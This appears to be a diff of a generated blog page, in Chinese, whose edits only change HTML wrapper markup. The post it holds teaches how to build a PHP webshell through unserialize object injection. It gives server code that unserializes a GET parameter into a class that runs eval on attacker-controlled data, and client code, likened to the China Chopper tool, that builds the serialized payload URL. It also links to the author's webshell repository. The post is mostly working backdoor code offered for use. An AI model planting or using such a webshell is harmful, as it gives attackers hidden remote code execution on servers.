@@ -117,20 +117,19 @@
 
         <span itemprop="articleBody"><h3 id="php的unserialize函数">php的unserialize函数</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
 对象对应的类有__wakeup,__destruct等函数,那么在unserialize函数执行后将执行对应的函数(__wakeup,__destruct等)
 
 refer:
 http://www.91ri.org/3960.html
 https://www.owasp.org/index.php/PHP_Object_Injection
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="利用unserialize构造webshell">利用unserialize构造webshell</h3>
 
 <h4 id="服务端webshell">服务端[webshell]</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
 
 class foo{
     public $data="text";
@@ -143,12 +142,11 @@ class foo{
 
 $file_name=$_GET['id'];
 unserialize($file_name);
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="客户端相当于菜刀">客户端[相当于菜刀]</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
 
 class foo{
     #public $data="phpinfo();";
@@ -158,26 +156,23 @@ class foo{
 $a=new foo;
 $b=serialize($a);
 echo "please visit uri:\n"."[your shell page url]"."?id=".$b;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="理解">理解</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
 ,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存
 的foo类模板的__wakeup,__destruct等函数,但是恰好这些函数会造成php代码执行[eval($this-&gt;data)],且$this-&gt;data可控.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>本文代码对应下载链接如下<br />
 <a href="https://github.com/3xp10it/xwebshell/tree/master/unserializePHP">download</a></p>
 
 <h4 id="more">more</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>后来发现下面这篇文章已经总结得得好了
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>后来发现下面这篇文章已经总结得得好了
 http://www.cnblogs.com/LittleHann/p/3522990.html
-</code></pre>
-</div>
+</code></pre></div></div>
 
 </span>
 
